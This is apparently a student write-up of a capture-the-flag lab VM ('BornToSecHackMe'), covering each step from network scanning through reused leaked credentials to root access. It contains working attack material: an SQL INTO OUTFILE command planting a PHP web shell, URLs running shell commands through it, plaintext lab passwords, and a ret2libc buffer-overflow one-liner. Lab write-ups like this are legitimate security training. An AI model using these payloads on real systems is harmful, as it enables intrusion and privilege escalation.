## 1 - Identifying the server

- After booting the VM, we used `ifconfig` to find the network address address :
``` console
$ ifconfig
[...]
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 979  bytes 208064 (208.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
[...]
```

- then, we used `nmap` to scan every address of the network

```
$ nmap 192.168.56.1-255
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-01 15:12 CET
Nmap scan report for bess-f3r6s4.clusters.42paris.fr (192.168.56.1)
Host is up (0.00054s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
5900/tcp open  vnc
9100/tcp open  jetdirect

Nmap scan report for 192.168.56.3
Host is up (0.00097s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (2 hosts up) scanned in 3.00 seconds
```

- We can see our server's address is `192.168.56.3` and notice it listens on different ports with a http(s) server, an ssh service and a ftp service.

## 2 - Finding the available routes

- So our first idea was to try and reach the website(s) hosted on the server. To do so, we used dirsearch:

```
 $ git clone https://github.com/maurosoria/dirsearch.git --depth 1

 $ cd dirsearch

 $ ./dirsearch.py -u 192.168.56.3

[...]

[15:19:52] 403 -  289B  - /cgi-bin/
[15:20:17] 301 -  314B  - /forum  ->  https://192.168.56.3/forum/
[15:20:17] 200 -    5KB - /forum/
[15:20:54] 301 -  319B  - /phpmyadmin  ->  https://192.168.56.3/phpmyadmin/
[15:20:57] 200 -    7KB - /phpmyadmin/
[15:20:58] 200 -    7KB - /phpmyadmin/index.php
[15:21:11] 403 -  294B  - /server-status
[15:21:11] 403 -  295B  - /server-status/
[15:21:42] 301 -  316B  - /webmail  ->  https://192.168.56.3/webmail/
[15:21:42] 403 -  307B  - /webmail/src/configtest.php

Task Completed
```

- We noticed 3 different routes that we could access : `/forum`, `/phpmyadmin`, and `/webmail`

## 3 - Exploring the website

- By visiting the forum, we saw a post by user lmezard on a thread called "Probleme login ?" which is a huge copy/paste of a connection log. In this log, we saw a suspicious line with what looked like a password 

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```
With this password we can connect to the session of lmezard on the forum.
On his profile we can find her email address :
`laurie@borntosec.net`

- Using this email address and the same password, we could login to her mailbox on route `/webmail`

- There we found the root password for the database :

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
- So we used that user/pass combination on route `/phpmyadmin` to access the DB

## 4 - Upload our backdoor

- Now, the idea we had after reading some resources about pentesting basics was to create a php shell backdoor on the server. This resource was quite helpful : https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/

- Trying different urls, we found the perfect path to upload our malicious php script : \
 `https://192.168.56.3/forum/templates_c/`

- So from the SQL interface of /phpmyadmin, we executed : \
 `SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/c.php"`
- As a result, we can see that our shell script now exists on the server :

![Alt text](./img/uploaded.png?raw=true "Optional Title")

- From our web browser, we can now execute shell commands on the server by using the following URL : \
`https://192.168.56.3/forum/templates_c/c.php?cmd=SHELL_COMMAND`

- For instance, if we try : \
`https://192.168.56.3/forum/templates_c/c.php?cmd=pwd` \
Our browser displays : `/var/www/forum/templates_c`

## 5 - Explore the file system through backdoor

- We used this to explore the file system and see what we could find: \
`https://192.168.56.3/forum/templates_c/c.php?cmd=ls+/` gave us this output: \
`bin boot cdrom dev etc home initrd.img lib media mnt opt proc rofs root run sbin selinux srv sys tmp usr var vmlinuz` \
So we tried `https://192.168.56.3/forum/templates_c/c.php?cmd=ls+/home` which gave us : \
`LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz` \
Interesting... \
Of course we tried : `https://192.168.56.3/forum/templates_c/c.php?cmd=ls+/home/LOOKATME` which gave us : \
`password`
Finally we did : `https://192.168.56.3/forum/templates_c/c.php?cmd=cat+/home/LOOKATME/password` which gave us : \
`lmezard:G!@M6f4Eatau{sF"`
- Ok, we now have a new user/password combination, which allows us to login in the virtual machine.

## 6 - lmezard's fun challenge
- On the home of user lmezard, we found a README telling us to `complete this little challenge and use the result as password for user 'laurie' to login in ssh`.
- Next to it, a file called "fun", which was in fact a tar archive : \
```
$ file fun
fun: POSIX tar archive (GNU)
```
- So, we decompressed it using `tar -xf fun -C /tmp/` (We need to use tmp here because we don't have rights on home folder), which created a `ft_fun` folder in /`tmp`, containing a lot of .pcap files, each of which contained unordered bits of c code for a program.

- We tried to `cat * > output` in order to run through the content and understood by scanning it that the program prints the password by getting each character from a function that is hidden somewhere among loads of useless other functions. Basically, we needed to get the return values of every `getmeN()` function for each value of N between 1 and 12, and then `SHA-256` the result to get the password.

- By scanning our output file, we could easily read the return values of `getmeN()` functions from N=8 to N=12, namely `w, n, a, g, e`.

- For the rest, we just did `cat * | grep return` and got this output :

```
//file483       return 'a';
//file697       return 'I';
        return 'w';
        return 'n';
        return 'a';
        return 'g';
        return 'e';
//file161       return 'e';
//file252       return 't';
//file163       return 'p';
//file640       return 'r';
//file3  return 'h';
```

- We first thought of `Ihatepwnage` which was already geeky enough for 42 school but were left with a "r", then we understood it was in fact `Iheartpwnage`, a string we gave to SHA-256 to get laurie's password which would finally allow us to login to our server through SSH with `ssh laurie@192.168.56.3 -p 22` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## 7 - Laurie's bomb challenge

- On laurie's home folder, there's a `README` : 
```
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
- ...and a binary executable called `bomb` which asks us to resolve 6 problems which we got through by decompiling the program with hex-rays and trying to understand the 6 steps to give a correct input that would defuse the bomb and correspond to the 6 hints given in the readme. Please check `resources` folder to see an approximate version of the decompiled program as well as our solver for phase 5. For phase 6, we also used chatGPT's help by asking it which set of numbers would satisfy the requirements of the function... Here's our final result :
```
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```
- By combining all these passwords in a single string, we were able to login as thor:
```
$ ssh thor@192.168.56.3 -p 22
password : Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

 - ### Important notice for this step:
 We had some troubles to figure out a few things, which made us go and check on slack for some more hints. Those hints were completely necessary and some of them were not specified by the subject:
- 1 - The 4th and 5th numbers in the last phase need to be reversed, which is okay since the subject specifies it
- 2 - For the 5th phase, the string "opekma" was the one we initially found, it also works to defuse the bomb and complies with the hint, so we could've spent much time on this with no other possible way to solve the puzzle than go and ask for help on slack/discord...
- 3 - Same for the 3rd phase, there are several possibilities to pass the phase while complying with the hint, good thing the first one we tried was the right one...

## 8 - Thor's turtle challenge
- Here we have another `README` that basically tell us that solving this challenge will give us zaz's password, and a text file called `turtle` that contains hundreds of instructions to... move a turtle ?

- So with the help of our good friend chatGPT we made a python script to draw the turtle's trajectory from the instruction file (check in resources folder), and saw the letters "SLASH" appear on the screen.

- At the end of the file, there's a hint saying `Can you digest the message? :)` which made us understand that we had to give the string "SLASH" to MD5 (Message Digest 5) hashing algo. Here' zaz password : `646da671ca01bb5d84dbb5fb2238dc8e`

## - Zaz's exploit challenge

- Here there's a binary executable called `exploit_me`, executable with root privileges, which calls strcpy on a buffer, copying argv[1] into it. We know this is a breach we can exploit to overflow the buffer and use a ret2libc technique. We tried to give the program this input : `./exploit_me $(python -c"print 'A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'ABCD' + '\xb7\xf8\xcc\x58'[::-1]")` 

- `0xb7e6b060` is the address of the `system()` function
- `0xB7F8CC58` is the address of the string `"/bin/sh"`

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c"print 'A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'ABCD' + '\xb7\xf8\xcc\x58'[::-1]")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��ABCDX���
# whoami
root
```


